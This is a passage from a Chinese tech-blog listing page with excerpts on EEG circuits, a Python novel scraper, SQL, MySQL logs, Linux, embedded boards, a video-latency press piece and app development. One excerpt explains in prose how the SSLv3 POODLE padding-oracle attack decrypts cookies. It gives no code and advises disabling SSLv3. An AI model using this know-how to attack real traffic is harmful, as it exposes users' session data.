右腿驱动详细电路及仿真：参考TI Matthew Hann 的文章：(温馨提醒：为保证后续阅读，手机用户长按松开拷贝地址到浏览器打开为宜)
http://www.cnblogs.com/myohao/p/8538685.html
另外附上采集电路的框图：
附开源电路图：
这个电路难者不会，会者不难。搞算法的可以不做了解。实在想自己做，可以去买专门脑电模块，名字我就不说了，广告嫌疑。我当时买的几十块钱一片，挺划来。
Part two:
采集完的数据保存下来，形成数据库。
以下放上外国人研究常用的数据库
(温馨提醒：为保证后续阅读，手机用户长按松开拷贝地址到浏览器打开为宜)
http://www.cnblogs.com/myohao/p/8538740.html
生理信号数据常用的格式为edf，而matlab常用的是mat,txt。
假设聪明的你已经在数据库里下载了edf格式的数据。不妨先了解下EDF格式具体内容：
HEADER RECORD
8 ascii : 数据格式的版本
80 ascii : 被试ID
80 ascii : 数据记录编号
8 ascii : 开始记录的日期 (dd.mm.yy) 8 ascii : 开始记录的时间 (hh.mm.ss) 8 ascii : 头比特数
44 ascii :保留给EDF+
8 ascii : 初始值-1，结束时被赋其他值
8 ascii : 数据持续记录时间，s 4 ascii : 记录几种信号种类
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73e6dcdb5f75235361423d439705cc40/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/361cc862e131d7b8abb5a7572eecc319/" rel="bookmark">
			python3实战（1）：网络小说爬取工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 本文是http://blog.csdn.net/c406495762/article/details/71158264的学习笔记 作者:Jack-Cui 博主链接:http://blog.csdn.net/c406495762 运行平台： OSX Python版本： Python3.x IDE： pycharm Beautiful Soup 简单来说，BeautifulSoup是python的一个库，最主要的功能是从网页抓取数据。官方解释如下：
BeautifulSoup提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。BeautifulSoup自动将输入文档转换为Unicode编码，输出文档转换为utf-8编码。你不需要考虑编码方式，除非文档没有指定一个编码方式，这时，Beautiful Soup就不能自动识别编码方式了。然后，你仅仅需要说明一下原始编码方式就可以了。BeautifulSoup已成为和lxml、html6lib一样出色的python解释器，为用户灵活地提供不同的解析策略或强劲的速度。 lxml
lxml是个非常有用的python库，它可以灵活高效地解析xml，与BeautifulSoup、requests结合，是编写爬虫的标准姿势。
二、实战步骤 爬虫在github的地址
1、环境安装
这里我们需要用到python的pip或者pip3来安装相关库和依赖，做法是运行cmd，转到你本地python安装目录下，有个script文件夹，到该文件夹的路径下运行安装命令就行了
安装BeautifulSoup：
pip3 install beautifulsoup4 安装lxml：
pip3 install lxml 2、PyCharm配置
如果使用开发工具的话，如果没有添加beautifulsoup4和lxml库的话，也会报错
打开File/Settings/Project:xxx/Project Interpreter，首先，在Project Interpreter选择本地python安装目录下的python.exe，
然后，在下面的列表中添加beautifulsoup4和lxml库
3、预备知识
想了解爬虫知识，首先得了解BeautifulSoup相关知识
详细内容可参照官方文档：http://beautifulsoup.readthedocs.io/zh_CN/latest/
但是我觉得参照的教程的博主写的更为通俗易懂：http://blog.csdn.net/c406495762/article/details/71158264
4、小说内容的爬取
这边同样的，以《笔趣看》小说网站（URL：http://www.biqukan.com/）为例
（1）单章小说内容的爬取
打开《一念永恒》小说的第一章（URL：http://www.biqukan.com/1_1094/5403177.html），进行审查元素分析
由审查结果可知，文章的内容存放在id为content，class为showtxt的div标签中：
局部放大：
因此我们，可以使用如下方法将本章小说内容爬取下来：
# -*- coding:UTF-8 -*- from urllib import request from bs4 import BeautifulSoup if __name__ == "__main__": download_url = 'http://www.biqukan.com/1_1094/5403177.html' head = {} head['User-Agent'] = 'Mozilla/5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/361cc862e131d7b8abb5a7572eecc319/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5dff27877827ed948b1d8aee20800160/" rel="bookmark">
			c&#43;&#43;Double类型不能直接比较大小
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		被一道C语言课后练习题卡了好久，，，原因竟然是double的精度问题。写篇博客标记一下这个错误。
如题，double a,b；然后直接if(a&gt;b)或者if(a&lt;b)或者if(a==b)都是不精确的。
标准做法应该要加一个eps。
const double eps = 1e-6//一般负六次就够了 int e = 10; if(a+eps&lt;10)//... if(a&lt;10-eps)//.... if(fabs(a-b)&lt;eps)//判断相等 当然也跟题目很坑有关系，
L1-031. 到底是不是太胖了 时间限制
400 ms
内存限制
65536 kB
代码长度限制
8000 B
判题程序
Standard
作者
陈越
据说一个人的标准体重应该是其身高（单位：厘米）减去100、再乘以0.9所得到的公斤数。真实体重与标准体重误差在10%以内都是完美身材（即 |真实体重-标准体重| &lt; 标准体重x10%）。已知1市斤=0.5公斤。现给定一群人的身高和实际体重，请你告诉他们是否太胖或太瘦了。
输入格式：
输入第一行给出一个正整数N（&lt;= 20）。随后N行，每行给出两个整数，分别是一个人的身高H（120 &lt; H &lt; 200；单位：厘米）和真实体重W（50 &lt; W &lt;= 300；单位：市斤），其间以空格分隔。
输出格式：
为每个人输出一行结论：如果是完美身材，输出“You are wan mei!”；如果太胖了，输出“You are tai pang le!”；否则输出“You are tai shou le!”。
输入样例：
3 169 136 150 81 178 155 输出样例：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5dff27877827ed948b1d8aee20800160/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5c027c1b3ca8977df2fab4397184f66/" rel="bookmark">
			多表联查（多表连接）（join）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多表联查（多表连接）（join）
1、 分类
内连接、自然连接、外链接（左外连接、右外连接、全外连接（mysql不支持））
2、 内连接 inner join（等值连接，制定对应的等值条件）
SELECT * FROM emp,dept;/*得到的数据是不对的*/
得到的数据叫做笛卡尔积：结果是两个表数据的乘积
使用内连接去查
SELECT * FROM emp INNER JOIN dept;
结果依然是笛卡尔积，是因为我们没有制定对应的等值条件
SELECT * FROM emp e INNER JOIN dept d WHERE e.deptno = d.deptno;
/*emp.deptno和dept.deptno这样的写法叫做：完全限定名
两个表中有相同的字段，类似于A村有个老张家，孩子叫张三
B村也有一个老张家，孩子也叫张三，
如果没有用到多表联查，就没有必要使用完全限定名，类似于
A村老张家的爸爸说，张三，吃饭了，指的是自己的孩子
用到了夺标联查，两家在一起，A村的老张家的爸爸说：张三，吃饭了
这个张三指的是谁？（不一定）
*/
提示：一般来讲，我们不使用内连接，因为效率低。用外链接
标准写法：select * from 表1 别名1 inner join 表2 别名2 where 别名1.xxx = 别名2.xxx;
SELECT * FROM emp e INNER JOIN dept d WHERE e.deptno = d.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5c027c1b3ca8977df2fab4397184f66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17325a256ce1bcaabd086cfa832533b4/" rel="bookmark">
			MySQL 中的重做日志，回滚日志以及二进制日志的简单总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL中有六种日志文件，分别是：重做日志（redo log）、回滚日志（undo log）、二进制日志（binlog）、错误日志（errorlog）、慢查询日志（slow query log）、一般查询日志（general log），中继日志（relay log）。
其中重做日志和回滚日志与事务操作息息相关，二进制日志也与事务操作有一定的关系，这三种日志，对理解MySQL中的事务操作有着重要的意义。
这里简单总结一下这三者具有一定相关性的日志。
重做日志（redo log）
作用：
确保事务的持久性。防止在发生故障的时间点，尚有脏页未写入磁盘，在重启mysql服务的时候，根据redo log进行重做，从而达到事务的持久性这一特性。
内容：
物理格式的日志，记录的是物理数据页面的修改的信息，其redo log是顺序写入redo log file的物理文件中去的。
什么时候产生：
事务开始之后就产生redo log，redo log的落盘并不是随着事务的提交才写入的，而是在事务的执行过程中，便开始写入redo log文件中。
什么时候释放：
当对应事务的脏页写入到磁盘之后，redo log的使命也就完成了，重做日志占用的空间就可以重用（被覆盖）。
对应的物理文件：
默认情况下，对应的物理文件位于数据库的data目录下的ib_logfile1&amp;ib_logfile2
innodb_log_group_home_dir 指定日志文件组所在的路径，默认./ ，表示在数据库的数据目录下。
innodb_log_files_in_group 指定重做日志文件组中文件的数量，默认2
关于文件的大小和数量，由以下两个参数配置：
innodb_log_file_size 重做日志文件的大小。
innodb_mirrored_log_groups 指定了日志镜像文件组的数量，默认1
其他：
很重要一点，redo log是什么时候写盘的？前面说了是在事物开始之后逐步写盘的。
之所以说重做日志是在事务开始之后逐步写入重做日志文件，而不一定是事务提交才写入重做日志缓存，原因就是，重做日志有一个缓存区Innodb_log_buffer，Innodb_log_buffer的默认大小为8M(这里设置的16M),Innodb存储引擎先将重做日志写入innodb_log_buffer中。
然后会通过以下三种方式将innodb日志缓冲区的日志刷新到磁盘
Master Thread 每秒一次执行刷新Innodb_log_buffer到重做日志文件。
每个事务提交时会将重做日志刷新到重做日志文件。
当重做日志缓存可用空间 少于一半时，重做日志缓存被刷新到重做日志文件
由此可以看出，重做日志通过不止一种方式写入到磁盘，尤其是对于第一种方式，Innodb_log_buffer到重做日志文件是Master Thread线程的定时任务。
因此重做日志的写盘，并不一定是随着事务的提交才写入重做日志文件的，而是随着事务的开始，逐步开始的。
另外引用《MySQL技术内幕 Innodb 存储引擎》（page37）上的原话：
即使某个事务还没有提交，Innodb存储引擎仍然每秒会将重做日志缓存刷新到重做日志文件。
这一点是必须要知道的，因为这可以很好地解释再大的事务的提交（commit）的时间也是很短暂的。
回滚日志（undo log）
作用：
保存了事务发生之前的数据的一个版本，可以用于回滚，同时可以提供多版本并发控制下的读（MVCC），也即非锁定读
内容：
逻辑格式的日志，在执行undo的时候，仅仅是将数据从逻辑上恢复至事务之前的状态，而不是从物理页面上操作实现的，这一点是不同于redo log的。
什么时候产生：
事务开始之前，将当前是的版本生成undo log，undo 也会产生 redo 来保证undo log的可靠性
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17325a256ce1bcaabd086cfa832533b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8bdc5ec64e277b491d078cb4408d3349/" rel="bookmark">
			机器学习实战(MachineLearinginAction) 第三章 决策树
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		决策树(decision tree)很流行的一个原因就是对机器学习算法的知识要求很低.
决策模块(decision block) 终止模块(terminating block):表示已经得出结论,可以终止运行 分支(branch)连接决策模块或终止模块.
有点:计算复杂度不高,易于理解,对中间值的缺失不敏感,可处理不相关特征数据. 缺点:可能会产生过度匹配问题. 使用数据类型:数值型和标称型
创建数据集
def createDataSet(): dataSet = [[1, 1, 'yes'], [1, 1, 'yes'], [1, 0, 'no'], [0, 1, 'no'], [0, 1, 'no']] labels = ['no surfacing','flippers'] #change to discrete values return dataSet, labels 计算信息熵 信息增益(information gain) 熵(entropy) 如果待分类的事物可能划分在多个分类中,则符号 xi x i 的信息定义为 l(xi)=−log2p(xi) l ( x i ) = − l o g 2 p ( x i ) ,注意这个是信息值 其中 p(xi) p ( x i ) 是选择该分类的概率.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8bdc5ec64e277b491d078cb4408d3349/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1e129ae9daa87307d75023128e45233/" rel="bookmark">
			清流鼎点发布超低延时技术，50ms超低延时赋能多行业强交互场景丨Xtecher 前线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网址｜www.xtecher.com
微信公众号ID｜Xtecher
“我们做的是小而精的硅谷式公司，使命是用技术改变世界”，清流鼎点（PowerInfo）CEO要文涛如此强调该公司的使命和技术基因。
3月5日，清流鼎点（PowerInfo）举办了一场别开生面的发布会，向外界披露了他们最近取得的新突破——新一代iLive方案，在视频传输核心技术上又有了质的飞跃。具体体现在超低延时视频互动以及弱网下的多径传输。这两项功能的技术指标均处于业界领先水平，可以帮助和促使众多应用行业产生变革。
通俗来说，市面上普遍应用的网络视频互动技术体验，延时一般平均在200ms左右，而清流鼎点的最新研发技术能达到50ms！那么，50ms的超低延时技术，在整个产业内具有何等意义？
解锁更多强交互应用场景
随着微信、QQ以及各类直播软件占据人们的日常生活，人们早已习惯视频通话、观看直播等社交和娱乐方式，对于一般用户而言，目前的普遍技术已经能满足日常需求，但在更多商业和娱乐场景中，普遍的视频传输技术仍然有较大局限性。
“当前通话质量不佳”就是很多人在进行微信视频通话时遇到的烦恼，当wifi或4G信号不稳定时，通话和视频传输常常因此而卡顿，给沟通带来极大不便。同时，由于普遍技术延迟相对较高，视频合唱、隔空斗舞等娱乐交互项目往往也体验不佳。
而面向垂直行业、专用场景推出的新一代iLive方案，能够实现50ms以内的超低延时，将改善用户进行视频、娱乐交互时的体验，同时还将解锁更多强交互的应用场景。
例如在线教育，对延时高度敏感，尤其是语言、音乐类教学，超过100ms以上的延迟均会影响互动体验，进而影响教学质量。再有远程控制技术，如远程手术、远程反恐机器人，延时会导致操作者对实际环境的误判，并产生错误操作。那么显然，上述场景正是50ms超低延时技术的用武之地。
清流鼎点（PowerInfo）创始人兼CTO李毅博士谈到，正常人类的神经传输速度是100米每秒，许多心理学者对人的生理反应时间的实验都测得是100多毫秒，所以PowerInfo认为视频传输如果突破100ms的门槛，就具备替代人类视觉的可能，可以真正应用在多个行业，不再局限于目前若干简单娱乐应用了。
值得一提的是，PowerInfo新一代iLive方案除了实现超低延时外，另一项重要创新便是弱网下的多径传输。该技术可实现手机终端在若WIFI条件下，4G信道能同时传输，保证了网络的稳和流畅。
发布会现场，通过新一代iLive方案，PowerInfo团队在北京海淀区清华科技园（PowerInfo 公司总部）和朝阳区望京SOHO（PowerInfo 参股投资方 百合佳缘集团总部）这相距超过15公里的两处场地的演示，令人印象深刻。
两边嘉宾利用手机、Pad等常用数码设备进行了视频互动，通过快速交替数数、拍摄秒表、斗舞、合唱等方法对比了Wechat视频聊天和PowerInfo iLive超低延时方案的体验差异，可以明显感受到，iLive超低延时方案传输速度高于Wechat视频聊天。而凭借着弱网下的多径传输，iLive超低延时方案可在wifi信号弱的场景，实现比Wechat视频聊天更加流畅的交互体验。
可以预见，PowerInfo这一项新的技术突破，将在更多强交互应用场景中发挥作用，从而深刻影响人们的社交、文娱生活。
高技术壁垒占据竞争制高点
发布会现场，来自清华大学的两位校园歌手在相距15公里的两处场地共同演唱了《无问西东》，将这场发布活动推向高潮，也令人更加领略 iLive超低延时方案的价值。
通过PowerInfo iLive的demo APP ，一方弹吉他伴奏，一方演唱，两边的合唱者几乎感受不到延迟，可以很顺畅地演绎完一首歌。用这样的技术，完全可以做到和远在各地的好友一起唱歌斗歌、甚至组建线上乐队！正所谓“视频所在，无问西东”。
而在这背后，是PowerInfo团队对诸多技术难题的攻克。
从技术层面来说，衡量一个视频传输技术，尤其是在移动网络环境下的视频传输技术的优劣，一般会有三个指标——能否将延时尽可能降低；能否将视频质量尽可能提高；能否将卡顿尽可能减少。这三个指标恰又是互相制约的，如何在这三个指标上进行平衡，就是这项技术的难点所在。
而PowerInfo已然设计出了一套趋近完美的解决方案——第一是将编码、传输、解码技术紧密结合，从整体角度构造紧耦合系统。第二是依靠近二十年的技术积累，深入编码、封装、网络丢包模型、延迟预测、带宽调节、缓冲控制、解码纠错等每一个技术细节，追求极致，以1ms为单位持续优化。第三是基于对海量数据的分析设计质量、流畅、延迟之间的平衡关系，同时还可针对不同场景给出不同的平衡模式。
难能可贵的是，这套解决方案普通互联网便可实施，不需要昂贵的专网，大大了节省成本。李毅博士表示，下一步PowerInfo将继续在技术上持续攻坚，争取不断降低延时，“光速是我们的目标。”
PowerInfo团队创始人全部来自清华大学计算机系，在网络视频领域，特别是视频编码及传输领域有将近20年的持续积累，为包括央视网、映客、Starmaker、dokidoki、一起秀、肆客在内的十数家优质客户及他们共计超过2亿的最终用户提供着视频服务，是网络视频传输领域的专家。
而凭借着技术和经验的积累，以及对技术的高标准和不懈研发，PowerInfo正在业内铸就了自己的技术壁垒，占据着竞争的制高点。
扩张商业版图
取得了技术的突破后，PowerInfo将在此前客户合作的基础上，进一步扩张商业版图，下一步将在教育、音乐、娱乐等行业发力。
要文涛认为，强互动的垂直行业，是PowerInfo及新一代iLive方案所面临的机会，50ms的超低延时技术恰恰解决了在线教育、在线娱乐等高延时痛点，成为各垂直行业的刚需。
“PowerInfo将在深耕核心技术研发的基础上，加快产品化、方案化进程。并尝试与产业链上的AI公司合作，做视觉AI、游戏解决方案等等。”
要文涛的目标简单明确：追求极致，不断创新、迭代音视频互动技术，为用户提供更流畅、更清晰、更低延时的视觉体验，通过视频技术赋能行业，同时深入挖掘更多具体的行业应用场景，以技术服务世界，用技术改变世界。
对于仍在技术攻坚道路上努力的PowerInfo而言，其未来将给世界带来的更多变革，值得期待。
━━━━━
封面来源：网络 排版：Forest 校对：Forest
━━━━━
如果您有国内外科技行业新鲜资讯或独到见解，欢迎与Xtecher联系
微信：littlefish_forever
邮箱：xiru.duan@xtecher.com
Xtecher官网平台现开通认证作者，
有发稿意向的个人或媒体，可联系微信：springfreedom
（添加好友请注明公司、职位、事由）
点击 | 关键词 | 查看对应内容
微信号：Xtecher 关注未来的人
都关注了Xtecher
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbc066ddbff60b69ddbf70d0ec254c03/" rel="bookmark">
			Linux下查看进程打开的文件句柄数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		---查看系统默认的最大文件句柄数，系统默认是1024
# ulimit -n
1024
----查看当前进程打开了多少句柄数
# lsof -n|awk '{print $2}'|sort|uniq -c|sort -nr|more
131 24204　57 24244　57 24231　........
其中第一列是打开的句柄数，第二列是进程ID。
可以根据ID号来查看进程名。
# ps aef|grep 24204
nginx　24204 24162 99 16:15 ?　00:24:25 /usr/local/nginx/sbin/nginx -s
Linux有硬性限制和软性限制。可以通过ulimit来设定这两个参数。方法如下，以root用户运行以下命令：
# ulimit -HSn 4096
以上命令中，H指定了硬性大小，S指定了软性大小，n表示设定单个进程最大的打开文件句柄数量。个人觉得最好不要超过4096，毕竟打开的文件句柄数越多响应时间肯定会越慢。设定句柄数量后，系统重启后，又会恢复默认值。如果想永久保存下来，可以修改.bash_profile文件，可以修改 /etc/profile 把上面命令加到最后.
出处：http://blog.csdn.net/lastsweetop/article/details/6440136
永久生效的方法：
修改/etc/security/limits.conf文件
在文件末尾添加
[html] view plain copy * soft nofile 204800 * hard nofile 204800 * soft nproc 204800 * hard nproc 204800 * 代表针对所有用户 noproc 是代表最大进程数 nofile 是代表最大文件打开数 表 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbc066ddbff60b69ddbf70d0ec254c03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe139224133b8f6ec5b0ddbe9136b814/" rel="bookmark">
			S3C2440开发板烧录笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		S3C2440开发板烧录笔记
本篇博客来自凌云实验室开发板介绍及其烧录学习笔记
1. 开发板基础和介绍 三星公司的 16/32 位精简指令集（RISC）微处理器 S3C2440A基于 ARM920T 核心，0.13µm 的 CMOS 标准宏单元和存储器单元它采用了新的总线架构如先进微控制总线构架（AMBA）1 主要注意：256M的nandflash,64M的内存带DM9000网卡,网卡需要改设置。
2. 启动原理+流程 2.1 内存介绍 SRAM：Static Random-Access Memory，是随机存取存储器的一种。所谓的“静态”，是指这种存储器只要保持通电，里面储存的数据就可以恒常保持。
SDRAM：Synchronous Dynamic Random Access Memory，掉电易丢失，需要初始化。
FLASH ：长寿命的非易失性（在断电情况下仍能保持所存储的数据信息）的存储器，可分为两种，一种是NOR型闪存，以编码应用为主，其功能多与运算相关；另一种为NAND型闪存，主要功能是存储资料。
2.2 系统运行过程 cpu执行程序，首先将程序烧录进开发板，程序在SDRAM中运行，开机程序不能直接运行，但SRAM可以运行，所以在SRAM中运行一个小程序来初始化cpu、初始化内存、初始化nandflash，就可以引导程序运行起来。
2.2.1.j-link加载bootstrap程序到SRAM 0地址上运行，该程序用来初始化外部SDRAM 在安装好的j-link Commander加载起点文件
****** Error: Unable to halt ARM core Found 1 JTAG device, Total IRLen = 4: #0 Id: 0x0032409D, IRLen: 04, Unknown device JTAG speed: 1000 kHz J-Link&gt;h Info: J-Link: ARM9 CP15 Settings changed: 0xC000107E from 0x00000078, MMU Off, ICache On, DCache On PC: (R15) = 33F847A4, CPSR = 800000D3 (SVC mode, ARM FIQ dis.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fe139224133b8f6ec5b0ddbe9136b814/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8dc0edfc36e4a6c6404c90a3006a8d80/" rel="bookmark">
			CVE-2014-3566 SSLv3 POODLE原理分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		insight-labs · 2014/10/15 14:11
0x00 背景 POODLE攻击是针对SSLv3中CBC模式加密算法的一种padding oracle攻击。这个攻击方式和之前的BEAST攻击方式很像，可以让攻击者获取SSL通信中的部分信息的明文，比如cookie。和BEAST不同的是，它不需要对明文内容的完全控制，所以操作起来更加贴近实战。
从根本上说，这是SSL设计上的问题，就像 Lucky13 和 Vaudenay's two atacks 这些漏洞里面描述的一样，SSL的加密和认证过程搞反了，SSL先进行认证之后再加密。
0x01 细节 首先考虑这个明文HTTP请求, 我把它分成了 8字节的块，就像3DES加密，但是这个方法对16字节的AES块加密一样适用:
最后一个块里包含了7个字节的填充(padding),用·来表示，最后一个字节7是填充长度，我用了虚构的8字节MAC校验码。在传输前，这些数据都会被3DES或者AES加密。现在来回顾下CBC解密的过程，这张图来自wikipedia:
攻击者可以控制HTTP请求中的路径和主体，从而让请求的内容满足如下条件:
后面的padding填充部分填充了一整个block cookie的第一个字节正好在某个块的末尾的字节 复制代码 攻击者需要做的是把包含cookie第一个字节(出现在这个块的末尾，例如块中的内容是 Cookie:a，a正好在8字节块的末尾)的那个块,替换padding的那个块发送给接收者(服务器)。
一般来说，服务器会拒绝这段密文，因为CBC校验失败了，攻击者需要重新发送，平均来说，每256个请求中有一个会被服务器接受，只要服务器接受了，根据CBC的解密过程，攻击者就知道了cookie的第一个字节(明文)的和上一个块最后一个字节的密文 XOR 后是 7或者15(分别对应块长度8或16)。
作为中间人，我们可以看到任何一段密文，所以
P XOR K = C C XOR K = P 复制代码 三个变量我们只要知道了两个就可以解密出另一个，所以 Cookie第一字节 XOR 密文最后一个字节 = 15
我们只要把 15 XOR 密文最后一个字节就知道了cookie的第一个字节。
因为可以解密的窗口大小只有1字节(前面任意一个块的最后一个字节)，所以需要通过js控制HTTP请求路径的长度，比如 GET/, GET /A, GET /AA...把需要解密的cookie的位置逐渐顶到解密窗口中，每次解密一个字节平均需要256次请求，攻击者就可以用256*n次构造的请求来解密SSLv3中任意位置的明文。
这个漏洞的主要成因是因为SSLv3没有规定padding填充块字节的内容，只校验填充块最后一个字节，因为TLS会检查填充块的内容所以在TLS上同样的攻击方式成功率只有2^-64或者2^-128。
0x02 解决方式 把SSLv3关了，SSLv3已经过期用了15年了。
参考： www.imperialviolet.org/2014/10/14/… www.openssl.org/~bodo/ssl-p…
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/84e4e9f1beb01d1586afd67a8e9be3ab/" rel="bookmark">
			微信小程序之缓存（本地缓存，同步缓存，异步缓存）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于本地缓存 1.wx.setStorage（wx.setStorageSync）、wx.getStorage（wx.getStorageSync）、wx.clearStorage（wx.clearStorageSync）可以对本地缓存进行设置、获取和清理。本地缓存最大为10MB
2.localStorage 是永久存储
一、异步缓存 wx.setStorage(OBJECT)
将数据存储在本地缓存中指定的 key 中，会覆盖掉原来该 key 对应的内容
wx.setStorage({ key:"key", data:"value" }) wx.getStorage(OBJECT)
从本地缓存中异步获取指定 key 对应的内容。
wx.getStorage({ key: 'key', success: function(res) { console.log(res.data) } }) wx.getStorageInfo(OBJECT)
异步获取当前storage的相关信息
wx.getStorageInfo({ success: function(res) { console.log(res.keys) console.log(res.currentSize) console.log(res.limitSize) } }) wx.removeStorage(OBJECT)
从本地缓存中异步移除指定 key 。
wx.removeStorage({ key: 'key', success: function(res) { console.log(res.data) } }) 二、同步缓存 wx.setStorageSync(KEY,DATA)
将 data 存储在本地缓存中指定的 key 中，会覆盖掉原来该 key 对应的内容，这是一个同步接口。
wx.getStorageSync(KEY)
从本地缓存中同步获取指定 key 对应的内容。
wx.getStorageInfoSync
同步获取当前storage的相关信息
wx.removeStorageSync(KEY)
从本地缓存中同步移除指定 key 。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/84e4e9f1beb01d1586afd67a8e9be3ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13fa21f86b95497301d84a41ebe8c95e/" rel="bookmark">
			QT5 error: cannot find -lGL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		遇到的问题 今天在Debian上安装Qt5.7.1时遇到运行Qt自带测试程序提示error: cannot find -lGL。错误信息提示找不到OpenGL相关的库，楼主之前在Ubuntu上装过没有遇到类似的问题。最后总结了下原因主要是因为Qt5.0默认会将OpenGL加入工程，但是有的机器上没有安装OpenGL。解决方案就是在当前机器上安装OpenGL。
安装步骤 1、安装基本的编译环境
$ sudo apt-get install build-essential 2、安装OpenGL库
$sudo apt-get install libgl1-mesa-dev
3、安装OpenGL Utilities(基于OpenGL库的一个工具箱，不一定需要安装)
$sudo apt-get install libglu1-mesa-dev 4、安装OpenGL Utility ToolKit（建立在OpenGL Utilities上的工具箱，不一定需要安装）
$sudo apt-get install libglut-dev 可能遇到的问题：
shell提示：正在读取软件包列表... 完成正在分析软件包的依赖关系树 正在读取状态信息... 完成 E: 未发现软件包 libglut-dev 解决方案：
使用$sudo apt-get install freeglut3-dev 命令
代替
$sudo apt-get install libglut-dev 命令。
网友遇到的问题 另外一个会导致报这个错误的原因是安装了OpenGL库，但是路径不对。楼主自己是没有遇到这类问题，还是在这里也Mark一下防止以后遇到类似的问题。
$ locate libGL /usr/lib/i386-linux-gnu/mesa/libGL.so.1 /usr/lib/i386-linux-gnu/mesa/libGL.so.1.2.0 /usr/lib/x86_64-linux-gnu/libGLEW.so.1.10 /usr/lib/x86_64-linux-gnu/libGLEW.so.1.10.0 /usr/lib/x86_64-linux-gnu/libGLEWmx.so.1.10 /usr/lib/x86_64-linux-gnu/libGLEWmx.so.1.10.0 /usr/lib/x86_64-linux-gnu/libGLU.so.1 /usr/lib/x86_64-linux-gnu/libGLU.so.1.3.1 /usr/lib/x86_64-linux-gnu/mesa/libGL.so.1 /usr/lib/x86_64-linux-gnu/mesa/libGL.so.1.2.0 /usr/lib/x86_64-linux-gnu/mesa-egl/libGLESv2.so.2 /usr/lib/x86_64-linux-gnu/mesa-egl/libGLESv2.so.2.0.0 $ sudo ln -s /usr/lib/x86_64-linux-gnu/mesa/libGL.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13fa21f86b95497301d84a41ebe8c95e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/899f8980f905cf9bb6f3d6e1d9c61377/" rel="bookmark">
			Android嵌套问题：ScrollView嵌套RecyclerView完全展示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 实现功能：RecyclerView外层套着ScrollView，使RecyclerView完全展示数据。 实际上ScrollView嵌套RecyclerView，RecyclerView中的数据不会全部展示，显示一行或者两行等情况。
&lt;ScrollView android:layout_width="match_parent" android:layout_height="match_parent" android:background="@color/color_ffffff" android:orientation="vertical" android:scrollbars="none"&gt; &lt;LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical"&gt; &lt;android.support.v7.widget.RecyclerView android:id="@+id/setting_info_rlv" android:layout_width="match_parent" android:layout_height="match_parent" android:focusableInTouchMode="false" android:scrollbars="none" /&gt; &lt;/LinearLayout&gt; &lt;/ScrollView&gt; 解决方案：直接给RecyclerView外嵌套一个布局RelativeLayout，再给RelativeLayout设置 属性android:descendantFocusability="blocksDescendants" &lt;RelativeLayout android:id="@+id/setting_info_ll_photo" android:layout_width="match_parent" android:layout_height="match_parent"&gt; &lt;android.support.v7.widget.RecyclerView android:id="@+id/setting_info_rlv" android:layout_width="match_parent" android:layout_height="match_parent" android:focusableInTouchMode="false" android:scrollbars="none" /&gt; &lt;/RelativeLayout&gt; 最后：recyclerview.setnestedscrollingenabled( false); //禁止recyclerView嵌套滑动 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebe80394c7e9b021a69bec8bd0e07e3c/" rel="bookmark">
			Linux内核版本与系统版本信息查看以及x86与x86_64的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
